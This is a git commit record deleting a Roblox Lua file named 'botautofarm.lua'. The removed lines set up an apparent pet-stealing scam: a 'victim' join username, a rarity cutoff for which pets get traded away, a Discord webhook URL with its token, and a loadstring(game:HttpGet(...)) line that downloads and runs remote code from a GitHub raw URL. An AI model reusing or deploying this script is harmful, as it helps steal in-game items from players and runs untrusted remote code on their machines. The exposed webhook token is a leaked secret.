6f80d1fb763c7dedbee45b63f6ebcf0d06de378d
relapsedddd <callumlovesdad@gmail.com>
2025-04-19 11:11:42 -0600

    Delete botautofarm.lua

--- botautofarm.lua
+++
@@ -1,6 +0,0 @@
-_G.Username = "callumlovesdad" -- user you should join victim on
-_G.min_chance = 10000 -- 10000 means it only trades pets that are 1 in 10k or rarer
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1363013765821632582/3P8sSydrl2g-9dGj6VXi-maxNau__MEauJDEb16UzH4lQHZlNbc29qhH3AvxsuEuR-Lc" -- change to your webhook 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/spookzv4/bubblegum/refs/heads/main/FREEbgsi.lua"))()
